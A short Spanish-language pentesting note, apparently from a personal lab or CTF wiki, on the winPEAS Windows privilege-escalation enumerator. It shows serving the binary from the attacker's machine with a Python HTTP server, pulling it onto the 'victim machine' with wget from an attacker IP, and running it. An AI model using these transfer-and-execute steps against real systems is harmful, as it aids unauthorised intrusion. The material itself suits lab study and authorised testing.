Enumera posibles escaladas de privilegio para maquinas windows de manera automatica

-------
# Links
[Link del proyecto en github](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
[Link del archivo directo para descargar](https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe)

------

# Como pasarlo a la maquina victima

Abrimos un [[python3 -m http.server]] desde nuestra maquina

Desde la maquina victima: 
```shell
wget http://IpDeNuestraMaquina/winPEASx64.exe -outfile winPEASx64.exe
Ejemplo: wget http://10.10.16.16/winPEASx64.exe -outfile winPEASx64.exe
```

Desde la powershell ejecutamos `./winPEAS64.exe > win` y vamos a mandar el output a un archivo llamado win, por que si ejecutamos directamente el archivo, como es mucho texto no podemos visualizarlo todo en al consola ya que no nos deja hacer scroll muy arriba